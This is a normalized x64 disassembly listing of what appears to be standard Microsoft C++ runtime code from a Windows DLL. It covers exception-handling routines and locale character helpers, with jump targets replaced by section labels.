mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov rsi rdx
mov r14 rcx
test rdx rdx
jne r-xdata
xor edi edi
xor r12b r12b
cmp [ rdx ] edi
jle r-xdata
call sub_180021248
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov al r12b
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
call sub_180019c4c
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
lea r13 [ r11 + rcx + 0x4 ]
call sub_180019c4c
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
mov ebp [ r11 + rcx ]
test ebp ebp
jle r-xdata
inc edi
cmp edi [ rsi ]
jl r-xdata
movsxd rax edi
lea r15 [ rax + rax * 4 ]
mov r12b 0x1
dec ebp
add r13 0x4
test ebp ebp
jg r-xdata
call sub_180019c4c
mov rbx rax
movsxd rax [ r13 ]
add rbx rax
call sub_180019c34
movsxd rcx [ rsi + 0x4 ]
mov r8 [ r14 + 0x30 ]
lea rax [ rax + r15 * 4 ]
mov rdx rbx
add rcx rax
call sub_18001bd94
test eax eax
jne r-xdata
jmp r-xdata
sub_18001c1f0
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x80
mov rdi rcx
xor r13d r13d
mov [ rsp + 0x20 ] r13d
and [ rsp + 0xc0 ] r13d
and [ rsp + 0x48 ] r13
and [ rsp + 0x40 ] r13
call sub_18001e320
mov rax [ rax + 0xf8 ]
mov [ rsp + 0xd8 ] rax
call sub_18001e320
mov rax [ rax + 0xf0 ]
mov [ rsp + 0xd0 ] rax
mov rsi [ rdi + 0x50 ]
mov [ rsp + 0xc8 ] rsi
mov rax [ rdi + 0x48 ]
mov [ rsp + 0x38 ] rax
mov rbx [ rdi + 0x40 ]
mov r15 [ rdi + 0x30 ]
mov r12 [ rdi + 0x28 ]
mov [ rsp + 0x60 ] r12
call sub_18001e320
mov [ rax + 0xf0 ] rsi
call sub_18001e320
mov [ rax + 0xf8 ] rbx
call sub_18001e320
mov rdx [ rax + 0xf0 ]
mov rdx [ rdx + 0x28 ]
lea rcx [ rsp + 0x70 ]
call sub_180019ff4
mov r14 rax
mov [ rsp + 0x50 ] rax
cmp [ rdi + 0x58 ] r13
je r-xdata
mov r8d 0x100
mov rdx r12
mov rcx r15
call sub_180023e70
mov rbx rax
mov [ rsp + 0x48 ] rax
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
jmp r-xdata
mov [ rsp + 0xc0 ] 0x1
call sub_18001e320
mov rcx [ rax + 0x138 ]
mov [ rsp + 0x40 ] rcx
mov rcx r14
call sub_18001a06c
test r13d r13d
jne r-xdata
call sub_18001e320
mov [ rax + 0xf0 ] r15
call sub_18001e320
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_18001a038
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_18001c098
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_18001c2f5
mov [ rsp + 0x20 ] 0x1
call sub_18001e320
and [ rax + 0x2c0 ] 0x0
mov rsi [ rsp + 0xc8 ]
cmp [ rsp + 0xc0 ] 0x0
je r-xdata
lea r9 [ rsi + 0x20 ]
mov r8d [ rsi + 0x18 ]
mov edx [ rsi + 0x4 ]
mov ecx [ rsi ]
mov dl 0x1
mov rcx rsi
call sub_18001c098
mov r11 [ rsp + 0x40 ]
lea r9 [ r11 + 0x20 ]
mov r8d [ r11 + 0x18 ]
mov edx [ r11 + 0x4 ]
mov ecx [ r11 ]
jmp r-xdata
call sub_18001e320
mov [ rax + 0xf0 ] r15
call sub_18001e320
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
call [ RaiseException@IAT ]
mov r13d [ rsp + 0x20 ]
mov rbx [ rsp + 0x48 ]
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
mov r12 [ rsp + 0x60 ]
mov r14 [ rsp + 0x50 ]
mov rcx r14
call sub_18001a06c
test r13d r13d
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_18001a038
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_18001c098
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_18001c404
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov rsi r9
mov rdi r8
mov r12 rdx
mov r14 rcx
xor ebx ebx
mov r13d [ r8 + 0x4 ]
test r13d r13d
je r-xdata
mov r11 rbx
movsxd r13 r13d
call sub_180019c34
lea r11 [ r13 + rax ]
jmp r-xdata
xor eax eax
test r13d r13d
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
call sub_180019c34
mov r11 rax
movsxd rax [ rdi + 0x4 ]
add r11 rax
jmp r-xdata
cmp [ rdi + 0x8 ] ebx
jne r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov ecx [ rdi ]
test ecx ecx
js r-xdata
test [ rdi ] 0x80000000
je r-xdata
mov edi 0x1
test cl 0x8
je r-xdata
movsxd rax [ rdi + 0x8 ]
add rax [ r12 ]
mov r12 rax
test [ rsi ] dil
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180023eb8
test eax eax
je r-xdata
cmp [ rsi + 0x18 ] ebx
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180023eb8
test eax eax
je r-xdata
call sub_180021248
mov edx edi
mov rcx r12
call sub_180023eb8
test eax eax
je r-xdata
mov r11 rbx
call sub_180019c4c
mov r11 rax
movsxd rax [ rsi + 0x18 ]
add r11 rax
jmp r-xdata
mov edx edi
mov rcx r12
call sub_180023eb8
test eax eax
je r-xdata
mov rcx [ r14 + 0x28 ]
mov [ r12 ] rcx
call sub_180023eb8
test eax eax
je r-xdata
call sub_180023eb8
test eax eax
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
test r11 r11
jne r-xdata
movsxd r8 [ rsi + 0x14 ]
mov rdx [ r14 + 0x28 ]
mov rcx r12
call sub_180018670
cmp [ rsi + 0x14 ] 0x8
jne r-xdata
mov eax ebx
jmp r-xdata
mov edx edi
mov rcx r12
call sub_180023eb8
test eax eax
je r-xdata
mov edx edi
mov rcx r12
call sub_180023eb8
test eax eax
je r-xdata
cmp [ r12 ] rbx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
cmp [ rsi + 0x18 ] ebx
je r-xdata
movsxd r10 [ rsi + 0x14 ]
lea rdx [ rsi + 0x8 ]
mov rcx [ r14 + 0x28 ]
call sub_18001c0dc
mov rdx rax
mov r8 r10
mov rcx r12
call sub_180018670
jmp r-xdata
mov rcx [ r12 ]
jmp r-xdata
mov rcx rbx
call sub_180019c4c
mov rcx rax
movsxd rax [ rsi + 0x18 ]
add rcx rax
jmp r-xdata
lea rdx [ rsi + 0x8 ]
call sub_18001c0dc
mov [ r12 ] rax
jmp r-xdata
mov al [ rsi ]
and al 0x4
neg al
sbb ecx ecx
neg ecx
add ecx edi
mov ebx ecx
mov [ rsp + 0x20 ] ecx
jmp r-xdata
call sub_180023eb8
test eax eax
je r-xdata
sub_18001c608
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi rcx
test [ r8 ] 0x80000000
je r-xdata
movsxd rdi [ r8 + 0x8 ]
add rdi [ rdx ]
mov rdi rdx
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
dec eax
jne r-xdata
call sub_18001c404
dec eax
je r-xdata
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_18001c0dc
mov rdx rax
mov rcx rdi
call r10
call sub_180019c4c
movsxd r10 [ rbx + 0x18 ]
add r10 rax
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_18001c0dc
mov rdx rax
mov r8d 0x1
mov rcx rdi
call r10
jmp r-xdata
call sub_180019c4c
mov r10 rax
movsxd rax [ rbx + 0x18 ]
add r10 rax
sub_18001c6b8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov r13 [ rsp + 0xa0 ]
mov rbp r9
mov r12 rdx
mov r14 r8
mov rbx rcx
lea r9 [ rax + 0x10 ]
mov r8 r13
mov rdx rbp
mov rcx r12
call sub_180019b48
mov r9 [ rsp + 0xb0 ]
mov rsi [ rsp + 0xa8 ]
mov rdi rax
test r9 r9
je r-xdata
call sub_180019c34
movsxd rcx [ rsi + 0xc ]
mov r9 rdi
add rax rcx
mov cl [ rsp + 0xc0 ]
mov r8 r14
mov [ rsp + 0x40 ] cl
mov rcx [ rsp + 0xb8 ]
mov [ rsp + 0x38 ] rbp
mov edx [ rcx ]
mov [ rsp + 0x30 ] r13
mov rcx r12
mov [ rsp + 0x28 ] edx
mov rdx rbx
mov [ rsp + 0x20 ] rax
call sub_18001a0cc
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov r8 rsi
mov rdx rax
mov rcx rbx
call sub_18001c608
sub_18001c77c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x60
cmp [ rcx ] 0x80000003
mov r14 r9
mov r12 r8
mov r15 rdx
mov rsi rcx
je r-xdata
mov rbx [ rsp + 0xa8 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_18001e320
mov edi [ rsp + 0xd0 ]
mov rbp [ rsp + 0xc0 ]
cmp [ rax + 0xe0 ] 0x0
je r-xdata
cmp [ rbp + 0xc ] 0x0
jne r-xdata
call sub_18001e320
mov rbx rax
call EncodePointer
cmp [ rbx + 0xe0 ] rax
je r-xdata
mov r12d [ rsp + 0xc8 ]
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xa0 ]
mov r8d edi
mov r9d r12d
mov rdx rbp
mov rcx r15
mov [ rsp + 0x20 ] rax
call sub_180019ec8
mov ecx [ rsp + 0xa0 ]
cmp ecx [ rsp + 0x50 ]
jae r-xdata
call sub_180021248
cmp [ rsi ] 0xe0434f4d
je r-xdata
lea rdi [ rax + 0xc ]
cmp [ rsi ] 0xe0434352
je r-xdata
inc ecx
add rdi 0x14
mov [ rsp + 0xa0 ] ecx
cmp ecx [ rsp + 0x50 ]
jb r-xdata
cmp r12d [ rdi - 0x8 ]
jg r-xdata
mov rax [ rsp + 0xd8 ]
mov r9 r14
mov r8 r12
mov [ rsp + 0x30 ] rax
mov rdx r15
mov rcx rsi
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbp
call sub_180019e74
test eax eax
jne r-xdata
lea r13 [ rdi - 0xc ]
cmp r12d [ r13 ]
jl r-xdata
call sub_180019c34
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
xor eax eax
call sub_180019c34
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_180019c34
add rax rbx
jmp r-xdata
call sub_180019c34
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
test [ rax + rdx - 0x14 ] 0x40
jne r-xdata
call sub_180019c34
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov ecx [ rsp + 0xa0 ]
call sub_180019c34
mov ecx [ rdi ]
mov r8 [ rsp + 0xb0 ]
dec ecx
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x38 ] r13
and [ rsp + 0x30 ] 0x0
movsxd rcx ecx
mov r9 r14
lea rdx [ rcx + rcx * 4 ]
lea rcx [ rax + rdx * 4 ]
movsxd rax [ rdi + 0x4 ]
mov rdx r15
add rcx rax
mov [ rsp + 0x28 ] rcx
mov rcx rsi
mov [ rsp + 0x20 ] rbp
call sub_18001c6b8
xor eax eax
call sub_180019c34
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_180019c34
add rax rbx
jmp r-xdata
cmp [ rax + 0x10 ] 0x0
jne r-xdata
sub_18001c9b4
mov rax rsp
mov [ rax + 0x20 ] rbx
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x3f ]
sub rsp 0x90
mov rbx [ rbp + 0x67 ]
mov r13 rdx
mov rdi rcx
xor r14b r14b
mov rdx r9
mov rcx rbx
mov r15 r9
mov r12 r8
mov [ rbp + 0x47 ] r14b
call sub_180021180
lea r9 [ rbp - 0x21 ]
mov r8 rbx
mov rdx r15
mov rcx r13
mov esi eax
call sub_180019b48
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_1800211f8
mov r8 rbx
mov rdx r15
cmp esi eax
jle r-xdata
mov rcx r13
call sub_1800211f8
mov esi eax
lea rcx [ rbp - 0x21 ]
mov r9d esi
call sub_1800211b0
mov r9d esi
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_1800211bc
jmp r-xdata
call sub_180021248
cmp esi [ rbx + 0x4 ]
jl r-xdata
cmp esi 0xffffffff
jl r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
call sub_18001e320
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rbp + 0x6f ] 0x0
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
mov rbx [ rsp + 0xe8 ]
add rsp 0x90
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_180021248
call sub_180021224
mov rax [ rbp + 0x7f ]
mov r9 r15
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rbp + 0x77 ]
mov rdx r13
mov [ rsp + 0x30 ] eax
mov rcx rdi
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call sub_18001c77c
jmp r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
call sub_18001e320
cmp [ rax + 0xf0 ] 0x0
je r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
call sub_18001e320
mov rdi [ rax + 0xf0 ]
call sub_18001e320
mov rcx [ rdi + 0x38 ]
mov r12 [ rax + 0xf8 ]
mov [ rbp + 0x57 ] r12
call sub_180019c80
mov edx 0x1
mov rcx rdi
call sub_180023eb8
test eax eax
jne r-xdata
mov eax [ rbx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
mov r8d [ rbp + 0x77 ]
lea rax [ rbp - 0x31 ]
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x39 ]
mov r9d esi
mov rdx rbx
mov rcx r13
mov [ rsp + 0x20 ] rax
call sub_180019ec8
mov ecx [ rbp - 0x39 ]
mov edx [ rbp - 0x31 ]
cmp ecx edx
jae r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
call sub_180021248
mov esi [ rbx + 0x20 ]
test esi esi
je r-xdata
lea r12 [ rax + 0x10 ]
call sub_18001e320
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
xor eax eax
movsxd rsi esi
call sub_180019c34
add rax rsi
jmp r-xdata
inc ecx
add r12 0x14
mov [ rbp - 0x39 ] ecx
cmp ecx edx
jb r-xdata
cmp esi [ r12 - 0xc ]
jg r-xdata
call sub_18001e320
mov r12 [ rax + 0x108 ]
call sub_18001e320
mov rdx r12
and [ rax + 0x108 ] 0x0
mov rcx rdi
call sub_18001c11c
test al al
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
test esi esi
je r-xdata
test rax rax
je r-xdata
cmp [ r12 - 0x10 ] esi
jg r-xdata
test r14b r14b
jne r-xdata
call sub_180019c34
movsxd r13 [ r12 ]
mov r14d [ r12 - 0x4 ]
add r13 rax
mov r12 [ rbp + 0x57 ]
xor r13d r13d
cmp [ r12 ] r13d
jle r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
xor edx edx
call sub_180019c34
mov rdx rax
movsxd rax [ rbx + 0x20 ]
add rdx rax
jmp r-xdata
mov r14b [ rbp + 0x47 ]
mov r13 [ rbp + 0x4f ]
call sub_180019c4c
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
lea rax [ rax + rdx + 0x4 ]
mov [ rbp - 0x29 ] rax
call sub_180019c4c
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
mov ecx [ rax + rdx ]
mov [ rbp - 0x35 ] ecx
test ecx ecx
jle r-xdata
call sub_180021224
xor esi esi
call sub_180021248
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
lea r9 [ rbp + 0x47 ]
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_180019b48
mov cl [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov [ rsp + 0x40 ] cl
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] rbx
or [ rsp + 0x28 ] 0xffffffff
and [ rsp + 0x20 ] 0x0
mov r9 rax
mov rdx rdi
mov rcx r13
call sub_18001a0cc
mov rcx rdi
call sub_18001c11c
test al al
jne r-xdata
dec r14d
add r13 0x14
jmp r-xdata
call sub_180019c4c
mov rcx [ rbp - 0x29 ]
mov r8 [ rdi + 0x30 ]
movsxd rcx [ rcx ]
add rax rcx
mov rcx r13
mov rdx rax
mov [ rbp - 0x19 ] rax
call sub_18001bd94
test eax eax
jne r-xdata
xor eax eax
call sub_180019c34
movsxd rcx [ r12 + 0x4 ]
add rax rsi
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180019c34
add rax rbx
jmp r-xdata
test r14d r14d
jle r-xdata
mov al [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov r14b 0x1
mov [ rsp + 0x40 ] al
lea rax [ r12 - 0x10 ]
mov r9 r15
mov [ rsp + 0x38 ] rax
mov rax [ rbp - 0x19 ]
mov rcx rdi
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] r13
mov r13 [ rbp + 0x4f ]
mov rdx r13
mov [ rbp + 0x47 ] r14b
mov [ rsp + 0x20 ] rbx
call sub_18001c6b8
jmp r-xdata
mov eax [ rbp - 0x35 ]
add [ rbp - 0x29 ] 0x4
dec eax
mov [ rbp - 0x35 ] eax
test eax eax
jg r-xdata
mov dl 0x1
mov rcx rdi
call sub_18001c098
lea r11 [ r--data ]
lea rdx [ rbp + 0x47 ]
lea rcx [ rbp - 0x11 ]
mov [ rbp + 0x47 ] r11
call sub_180018524
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x11 ]
mov [ rbp - 0x11 ] r11
call sub_180019410
int3
inc r13d
add rsi 0x14
cmp r13d [ r12 ]
jl r-xdata
lea rdx [ rw-data ]
mov rcx rax
call sub_1800189e8
test al al
jne r-xdata
mov edx [ rbp - 0x31 ]
mov ecx [ rbp - 0x39 ]
call sub_180019c34
movsxd rcx [ r12 + 0x4 ]
add rax rsi
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
sub_18001cea8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r14
sub rsp 0x40
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
call sub_18001e320
mov rdi [ rsp + 0x80 ]
cmp [ rax + 0x2c0 ] 0x0
mov edx 0x1fffffff
mov r8d 0x80000029
mov r9d 0x80000026
mov r14d 0x1
jne r-xdata
mov eax [ rbx + 0x4 ]
test al 0x66
je r-xdata
cmp [ rbx ] 0xe06d7363
je r-xdata
cmp [ rdi + 0xc ] 0x0
jne r-xdata
cmp [ rdi + 0x4 ] 0x0
je r-xdata
cmp [ rbx ] r8d
jne r-xdata
cmp [ rbx ] 0xe06d7363
jne r-xdata
mov eax [ rdi ]
and eax edx
cmp eax 0x19930521
jb r-xdata
mov eax r14d
cmp [ rsp + 0x88 ] 0x0
jne r-xdata
cmp [ rbx ] r9d
je r-xdata
cmp [ rbx + 0x18 ] 0xf
jne r-xdata
mov rax [ rsp + 0x90 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x88 ]
mov rdx rsi
mov [ rsp + 0x30 ] eax
mov al [ rsp + 0x98 ]
mov rcx rbx
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] rdi
call sub_18001c9b4
cmp [ rbx + 0x18 ] 0x3
jb r-xdata
cmp [ rdi + 0x20 ] 0x0
je r-xdata
and eax 0x20
je r-xdata
mov ecx [ rdi ]
and ecx edx
cmp ecx 0x19930522
jb r-xdata
cmp [ rbx + 0x60 ] 0x19930520
je r-xdata
cmp [ rbx + 0x20 ] 0x19930522
jbe r-xdata
xor eax eax
call sub_180019c34
movsxd rcx [ rdi + 0x20 ]
add rax rcx
jmp r-xdata
test eax eax
je r-xdata
cmp [ rbx ] r9d
jne r-xdata
test [ rdi + 0x24 ] r14b
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x8 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov r8 rdi
mov rdx rbp
mov rcx rsi
call sub_180019c9c
jmp r-xdata
cmp [ rbx ] r8d
jne r-xdata
mov r8 [ r12 + 0xf8 ]
mov rdx rbp
mov rcx rdi
call sub_1800210f4
mov ebx eax
cmp eax 0xffffffff
jl r-xdata
xor r11d r11d
call sub_180019c4c
mov rcx [ rbx + 0x30 ]
movsxd r11 [ rcx + 0x8 ]
add r11 rax
jmp r-xdata
mov esi [ rbx + 0x38 ]
cmp esi 0xffffffff
jl r-xdata
call sub_180021248
cmp eax [ rdi + 0x4 ]
jl r-xdata
movzx eax [ rsp + 0x98 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] eax
mov rax [ rsp + 0x90 ]
mov rdx rsi
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x88 ]
mov rcx rbx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rdi
call r11
jmp r-xdata
test r11 r11
je r-xdata
call sub_180021248
cmp esi [ rdi + 0x4 ]
jl r-xdata
mov r9d ebx
mov rcx rsi
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r14
pop r12
pop rdi
retn
mov rcx [ rbx + 0x28 ]
mov r9d esi
jmp r-xdata
mov rdx rbp
mov r8 rdi
call sub_18001bf0c
jmp r-xdata
sub_18001d0d0
lea rax [ sub_1800240d0 ]
lea rcx [ sub_180024c20 ]
mov [ rw-data ] rax
lea rax [ sub_1800240c0 ]
mov [ rw-data ] rcx
mov [ rw-data ] rax
lea rax [ sub_1800240c8 ]
mov [ rw-data ] rcx
mov [ rw-data ] rax
lea rax [ sub_180024064 ]
mov [ rw-data ] rax
lea rax [ sub_180024b88 ]
mov [ rw-data ] rax
lea rax [ sub_18002407c ]
mov [ rw-data ] rax
lea rax [ sub_180023fc4 ]
mov [ rw-data ] rax
lea rax [ sub_180023f44 ]
mov [ rw-data ] rax
retn
sub_18001d160
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x70
movsxd rdi ecx
lea rcx [ rbp - 0x20 ]
call sub_180018cdc
cmp edi 0x100
jae r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rdx [ rbp - 0x20 ]
cmp [ rdx + 0x10c ] 0x1
jle r-xdata
call sub_1800194ec
mov edx 0x1
mov [ rax ] 0x2a
mov [ rbp + 0x10 ] dil
mov [ rbp + 0x11 ] 0x0
mov r12d edi
lea rdx [ rbp - 0x20 ]
sar r12d 0x8
movzx ecx r12b
call sub_180024c7c
test eax eax
je r-xdata
mov rax [ rdx + 0x140 ]
movzx eax [ rax + rdi * 2 ]
and eax 0x1
lea r8 [ rbp - 0x20 ]
mov edx 0x1
mov ecx edi
call sub_180023d70
mov rdx [ rbp - 0x20 ]
jmp r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ rbp + 0x20 ]
je r-xdata
mov [ rbp + 0x10 ] r12b
mov [ rbp + 0x11 ] dil
mov [ rbp + 0x12 ] 0x0
mov edx 0x2
jmp r-xdata
mov rax [ rdx + 0x148 ]
movzx eax [ rax + rdi ]
jmp r-xdata
test eax eax
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx ecx [ rbp + 0x21 ]
shl eax 0x8
or eax ecx
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x40 ] 0x1
lea r9 [ rbp + 0x10 ]
mov eax [ rcx + 0x4 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edx
mov edx [ rcx + 0x14 ]
lea rcx [ rbp - 0x20 ]
call sub_18001bbb0
test eax eax
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rdi [ r11 + 0x18 ]
mov r12 [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18001d2d0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x70
movaps [ rsp + 0x60 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x58 ] rax
mov rsi rcx
mov rbx rcx
mov rdi rdx
lea rcx [ rsp + 0x20 ]
mov rdx r8
call sub_180018cdc
test rdi rdi
je r-xdata
test rsi rsi
jne r-xdata
mov [ rdi ] rbx
mov rdx [ rsp + 0x20 ]
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
cmp [ rsp + 0x38 ] sil
je r-xdata
movzx ecx [ rbx ]
mov rax [ rdx + 0x140 ]
movzx eax [ rax + rcx * 2 ]
and eax 0x8
movzx ecx [ rbx ]
lea r8 [ rsp + 0x20 ]
mov edx 0x8
call sub_180023d70
mov rdx [ rsp + 0x20 ]
jmp r-xdata
xorpd xmm0 xmm0
jmp r-xdata
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
lea r8 [ rsp + 0x20 ]
lea rcx [ rsp + 0x40 ]
mov rdx rbx
call sub_180024d10
test rdi rdi
je r-xdata
inc rbx
jmp r-xdata
test eax eax
je r-xdata
mov rcx [ rsp + 0x58 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0x70 ]
